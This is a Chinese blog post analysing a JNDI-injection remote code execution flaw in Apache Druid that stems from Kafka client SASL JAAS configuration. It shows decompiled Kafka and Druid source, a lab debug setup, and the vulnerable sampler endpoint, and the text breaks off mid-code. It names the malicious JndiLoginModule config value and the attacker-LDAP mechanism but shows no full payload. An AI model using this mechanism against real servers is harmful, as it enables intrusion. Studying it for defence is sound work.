@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="白给">
+    
+    <title>
+        
+            Kafka命令执行漏洞二-Apache Druid 代码执行漏洞 |
+        
+        白给&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/64.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/64.jpg","favicon":"/images/64.jpg","avatar":"/images/64.jpg","font_size":null,"font_family":"STKaiti","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"This is the Way","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["炼气","筑基","结丹","元婴","化神"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/64.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               白给&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/64.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">白给</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-04-24 22:38:36</span>
+        <span class="mobile">2023-04-24 22:38</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-24 22:39:34</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h4 id="Apache-Kafka"><a href="#Apache-Kafka" class="headerlink" title="Apache Kafka"></a>Apache Kafka</h4><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。</p>
+<p>此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应，攻击者可以使用它在 Kafka 连接服务器上执行 java 反序列化小工具链。当类路径中有小工具时，攻击者可以造成不可信数据的无限制反序列化（或）RCE 漏洞。</p>
+<p>此漏洞利用的前提是：需要访问 Kafka Connect worker，并能够使用任意 Kafka 客户端 SASL JAAS 配置和基于 SASL 的安全协议在其上创建&#x2F;修改连接器。 自 Apache Kafka 2.3.0 以来，这在 Kafka Connect 集群上是可能的。 通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何 Kafka 客户端的 <code>sasl.jaas.config</code> 属性设置为“com.sun.security.auth.module.JndiLoginModule”，它可以是通过“producer.override.sasl.jaas.config”,“consumer.override.sasl.jaas.config”或“admin.override.sasl.jaas.config”属性完成。</p>
+<h4 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h4><p>Apache Druid是一个高性能的实时大数据分析引擎，支持快速数据摄取、实时查询和数据可视化。它主要用于OLAP（在线分析处理）场景，能处理PB级别的数据。Druid具有高度可扩展、低延迟和高吞吐量的特点，广泛应用于实时监控、事件驱动分析、用户行为分析、网络安全等领域。通过使用Druid，企业和开发者可以快速获得实时分析结果，提升决策效率。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Druid可添加Apache Kafka数据，存在Apache Kafka导致的JNDI注入漏洞，造成远程代码执行</p>
+<h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><p>Apache Druid &lt;&#x3D; 25.0</p>
+<h2 id="二、KafkaConsumer"><a href="#二、KafkaConsumer" class="headerlink" title="二、KafkaConsumer"></a>二、KafkaConsumer</h2><p>上篇讲到Producer&lt;String, String&gt; producer &#x3D; new KafkaProducer&lt;&gt;(props); 可造成JNDI注入</p>
+<p>org.apache.kafka.clients.consumer.KafkaConsumer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaConsumer</span><span class="params">(Map&lt;String, Object&gt; configs)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>((Map)configs, (Deserializer)<span class="literal">null</span>, (Deserializer)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaConsumer</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>((Properties)properties, (Deserializer)<span class="literal">null</span>, (Deserializer)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaConsumer</span><span class="params">(Properties properties, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(Utils.propsToMap(properties), keyDeserializer, valueDeserializer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaConsumer</span><span class="params">(Map&lt;String, Object&gt; configs, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">ConsumerConfig</span>(ConsumerConfig.appendDeserializerToConfig(configs, keyDeserializer, valueDeserializer)), keyDeserializer, valueDeserializer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最终调用至此构造方法</span></span><br><span class="line">KafkaConsumer(ConsumerConfig config, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.closed = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.currentThread = <span class="keyword">new</span> <span class="title class_">AtomicLong</span>(-<span class="number">1L</span>);</span><br><span class="line">    <span class="built_in">this</span>.refcount = <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">GroupRebalanceConfig</span> <span class="variable">groupRebalanceConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroupRebalanceConfig</span>(config, ProtocolType.CONSUMER);</span><br><span class="line">        <span class="built_in">this</span>.groupId = Optional.ofNullable(groupRebalanceConfig.groupId);</span><br><span class="line">        <span class="built_in">this</span>.clientId = config.getString(<span class="string">&quot;client.id&quot;</span>);</span><br><span class="line">        LogContext logContext;</span><br><span class="line">        <span class="keyword">if</span> (groupRebalanceConfig.groupInstanceId.isPresent()) &#123;</span><br><span class="line">            logContext = <span class="keyword">new</span> <span class="title class_">LogContext</span>(<span class="string">&quot;[Consumer instanceId=&quot;</span> + (String)groupRebalanceConfig.groupInstanceId.get() + <span class="string">&quot;, clientId=&quot;</span> + <span class="built_in">this</span>.clientId + <span class="string">&quot;, groupId=&quot;</span> + (String)<span class="built_in">this</span>.groupId.orElse(<span class="string">&quot;null&quot;</span>) + <span class="string">&quot;] &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            logContext = <span class="keyword">new</span> <span class="title class_">LogContext</span>(<span class="string">&quot;[Consumer clientId=&quot;</span> + <span class="built_in">this</span>.clientId + <span class="string">&quot;, groupId=&quot;</span> + (String)<span class="built_in">this</span>.groupId.orElse(<span class="string">&quot;null&quot;</span>) + <span class="string">&quot;] &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.log = logContext.logger(<span class="built_in">this</span>.getClass());</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">enableAutoCommit</span> <span class="operator">=</span> config.maybeOverrideEnableAutoCommit();</span><br><span class="line">        <span class="built_in">this</span>.groupId.ifPresent((groupIdStr) -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (groupIdStr.isEmpty()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.log.warn(<span class="string">&quot;Support for using the empty group id by consumers is deprecated and will be removed in the next major release.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">this</span>.log.debug(<span class="string">&quot;Initializing the Kafka consumer&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.requestTimeoutMs = (<span class="type">long</span>)config.getInt(<span class="string">&quot;request.timeout.ms&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.defaultApiTimeoutMs = config.getInt(<span class="string">&quot;default.api.timeout.ms&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.time = Time.SYSTEM;</span><br><span class="line">        <span class="built_in">this</span>.metrics = buildMetrics(config, <span class="built_in">this</span>.time, <span class="built_in">this</span>.clientId);</span><br><span class="line">        <span class="built_in">this</span>.retryBackoffMs = config.getLong(<span class="string">&quot;retry.backoff.ms&quot;</span>);</span><br><span class="line">        List&lt;ConsumerInterceptor&lt;K, V&gt;&gt; interceptorList = config.getConfiguredInstances(<span class="string">&quot;interceptor.classes&quot;</span>, ConsumerInterceptor.class, Collections.singletonMap(<span class="string">&quot;client.id&quot;</span>, <span class="built_in">this</span>.clientId));</span><br><span class="line">        <span class="built_in">this</span>.interceptors = <span class="keyword">new</span> <span class="title class_">ConsumerInterceptors</span>(interceptorList);</span><br><span class="line">        <span class="keyword">if</span> (keyDeserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.keyDeserializer = (Deserializer)config.getConfiguredInstance(<span class="string">&quot;key.deserializer&quot;</span>, Deserializer.class);</span><br><span class="line">            <span class="built_in">this</span>.keyDeserializer.configure(config.originals(Collections.singletonMap(<span class="string">&quot;client.id&quot;</span>, <span class="built_in">this</span>.clientId)), <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            config.ignore(<span class="string">&quot;key.deserializer&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.keyDeserializer = keyDeserializer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valueDeserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.valueDeserializer = (Deserializer)config.getConfiguredInstance(<span class="string">&quot;value.deserializer&quot;</span>, Deserializer.class);</span><br><span class="line">            <span class="built_in">this</span>.valueDeserializer.configure(config.originals(Collections.singletonMap(<span class="string">&quot;client.id&quot;</span>, <span class="built_in">this</span>.clientId)), <span class="literal">false</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            config.ignore(<span class="string">&quot;value.deserializer&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.valueDeserializer = valueDeserializer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">OffsetResetStrategy</span> <span class="variable">offsetResetStrategy</span> <span class="operator">=</span> OffsetResetStrategy.valueOf(config.getString(<span class="string">&quot;auto.offset.reset&quot;</span>).toUpperCase(Locale.ROOT));</span><br><span class="line">        <span class="built_in">this</span>.subscriptions = <span class="keyword">new</span> <span class="title class_">SubscriptionState</span>(logContext, offsetResetStrategy);</span><br><span class="line">        <span class="type">ClusterResourceListeners</span> <span class="variable">clusterResourceListeners</span> <span class="operator">=</span> <span class="built_in">this</span>.configureClusterResourceListeners(keyDeserializer, valueDeserializer, <span class="built_in">this</span>.metrics.reporters(), interceptorList);</span><br><span class="line">        <span class="built_in">this</span>.metadata = <span class="keyword">new</span> <span class="title class_">ConsumerMetadata</span>(<span class="built_in">this</span>.retryBackoffMs, config.getLong(<span class="string">&quot;metadata.max.age.ms&quot;</span>), !config.getBoolean(<span class="string">&quot;exclude.internal.topics&quot;</span>), config.getBoolean(<span class="string">&quot;allow.auto.create.topics&quot;</span>), <span class="built_in">this</span>.subscriptions, logContext, clusterResourceListeners);</span><br><span class="line">        List&lt;InetSocketAddress&gt; addresses = ClientUtils.parseAndValidateAddresses(config.getList(<span class="string">&quot;bootstrap.servers&quot;</span>), config.getString(<span class="string">&quot;client.dns.lookup&quot;</span>));</span><br><span class="line">        <span class="built_in">this</span>.metadata.bootstrap(addresses);</span><br><span class="line">        <span class="type">String</span> <span class="variable">metricGrpPrefix</span> <span class="operator">=</span> <span class="string">&quot;consumer&quot;</span>;</span><br><span class="line">        <span class="type">FetcherMetricsRegistry</span> <span class="variable">metricsRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FetcherMetricsRegistry</span>(Collections.singleton(<span class="string">&quot;client-id&quot;</span>), metricGrpPrefix);</span><br><span class="line">        <span class="comment">//调用至ClientUtils.createChannelBuilder 接下来调用链与一相同，不再赘述</span></span><br><span class="line">        <span class="type">ChannelBuilder</span> <span class="variable">channelBuilder</span> <span class="operator">=</span> ClientUtils.createChannelBuilder(config, <span class="built_in">this</span>.time, logContext);</span><br><span class="line">        <span class="built_in">this</span>.isolationLevel = IsolationLevel.valueOf(config.getString(<span class="string">&quot;isolation.level&quot;</span>).toUpperCase(Locale.ROOT));</span><br><span class="line">        <span class="type">Sensor</span> <span class="variable">throttleTimeSensor</span> <span class="operator">=</span> Fetcher.throttleTimeSensor(<span class="built_in">this</span>.metrics, metricsRegistry);</span><br><span class="line">        <span class="type">int</span> <span class="variable">heartbeatIntervalMs</span> <span class="operator">=</span> config.getInt(<span class="string">&quot;heartbeat.interval.ms&quot;</span>);</span><br><span class="line">        <span class="type">ApiVersions</span> <span class="variable">apiVersions</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApiVersions</span>();</span><br><span class="line">        <span class="type">NetworkClient</span> <span class="variable">netClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NetworkClient</span>(<span class="keyword">new</span> <span class="title class_">Selector</span>(config.getLong(<span class="string">&quot;connections.max.idle.ms&quot;</span>), <span class="built_in">this</span>.metrics, <span class="built_in">this</span>.time, metricGrpPrefix, channelBuilder, logContext), <span class="built_in">this</span>.metadata, <span class="built_in">this</span>.clientId, <span class="number">100</span>, config.getLong(<span class="string">&quot;reconnect.backoff.ms&quot;</span>), config.getLong(<span class="string">&quot;reconnect.backoff.max.ms&quot;</span>), config.getInt(<span class="string">&quot;send.buffer.bytes&quot;</span>), config.getInt(<span class="string">&quot;receive.buffer.bytes&quot;</span>), config.getInt(<span class="string">&quot;request.timeout.ms&quot;</span>), config.getLong(<span class="string">&quot;socket.connection.setup.timeout.ms&quot;</span>), config.getLong(<span class="string">&quot;socket.connection.setup.timeout.max.ms&quot;</span>), <span class="built_in">this</span>.time, <span class="literal">true</span>, apiVersions, throttleTimeSensor, logContext);</span><br><span class="line">    	......</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.log != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.close(<span class="number">0L</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(<span class="string">&quot;Failed to construct kafka consumer&quot;</span>, var18);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、Apache-Druid环境配置"><a href="#三、Apache-Druid环境配置" class="headerlink" title="三、Apache Druid环境配置"></a>三、Apache Druid环境配置</h2><p>1、修改jvm.config，远程debug</p>
+<p>目录为apache-druid-xxx\conf\druid\single-server\micro-quickstart\coordinator-overlord\jvm.config</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="number">5005</span></span><br><span class="line">suspend=n表示的是启动Java应用时是否立即进入调试模式;</span><br><span class="line">suspend=y表示启动即暂停，suspend=n则表示启动时不需要暂停;</span><br><span class="line">address=*:<span class="number">5005</span>表示的是Debug监听的服务地址和端口，根据需求修改，上述配置会监听到<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-0.png"
+                      alt="img"
+                ></p>
+<p>2、启动Apache Druid</p>
+<p>运行bin&#x2F;下start-micro-quickstart</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-1.png"
+                      alt="img"
+                ></p>
+<p>访问ip:8888,成功访问</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-2.png"
+                      alt="img"
+                ></p>
+<h2 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h2><h3 id="前端输入"><a href="#前端输入" class="headerlink" title="前端输入"></a>前端输入</h3><p>Apache Druid添加kafka</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-3.png"
+                      alt="img"
+                ></p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>存在漏洞API接口为&#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler</p>
+<p>接口类如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//路径</span></span><br><span class="line"><span class="meta">@Path(&quot;/druid/indexer/v1/sampler&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SamplerResource</span>&#123;</span><br><span class="line">  <span class="comment">//post方法  </span></span><br><span class="line">  <span class="meta">@POST</span></span><br><span class="line">  <span class="comment">//指定http请求的MIME类型为application/json</span></span><br><span class="line">  <span class="meta">@Consumes(MediaType.APPLICATION_JSON)</span></span><br><span class="line">  <span class="comment">//指定http响应的MIME类型application/json</span></span><br><span class="line">  <span class="meta">@Produces(MediaType.APPLICATION_JSON)</span></span><br><span class="line">  <span class="meta">@ResourceFilters(StateResourceFilter.class)</span></span><br><span class="line">  <span class="keyword">public</span> SamplerResponse <span class="title function_">post</span><span class="params">(<span class="keyword">final</span> SamplerSpec sampler)</span>&#123;</span><br><span class="line">    <span class="comment">//Preconditions.checkNotNull(sampler, &quot;Request body cannot be empty&quot;) 判断sampler是否为空</span></span><br><span class="line">    <span class="comment">//调用sampler#sample()方法</span></span><br><span class="line">    <span class="keyword">return</span> Preconditions.checkNotNull(sampler, <span class="string">&quot;Request body cannot be empty&quot;</span>).sample();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.druid.client.indexing.SamplerSpec为接口，声明方法sample()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用于配置JSON 序列化和反序列化过程中使用哪种类型信息。该注解是实现多态类型的必要注解。</span></span><br><span class="line"><span class="comment">//配置此即可在 json 中通过 type 定义反序列化为子类</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = &quot;type&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SamplerSpec</span>&#123;</span><br><span class="line">  SamplerResponse <span class="title function_">sample</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-4.png"
+                      alt="img"
+                ></p>
+<p>org.apache.druid.indexing.seekablestream.SeekableStreamSamplerSpec实现接口SamplerSpec</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SeekableStreamSamplerSpec</span><span class="params">(</span></span><br><span class="line"><span class="params">  //ingestionSpec</span></span><br><span class="line"><span class="params">  <span class="keyword">final</span> SeekableStreamSupervisorSpec ingestionSpec,</span></span><br><span class="line"><span class="params">  <span class="meta">@Nullable</span> <span class="keyword">final</span> SamplerConfig samplerConfig,</span></span><br><span class="line"><span class="params">  <span class="keyword">final</span> InputSourceSampler inputSourceSampler</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//ingestionSpec不为空  dataSchema为ingestionSpec.dataSchema</span></span><br><span class="line"><span class="built_in">this</span>.dataSchema = Preconditions.checkNotNull(ingestionSpec, <span class="string">&quot;[spec] is required&quot;</span>).getDataSchema();</span><br><span class="line"><span class="comment">//ioConfig不为空</span></span><br><span class="line"><span class="built_in">this</span>.ioConfig = Preconditions.checkNotNull(ingestionSpec.getIoConfig(), <span 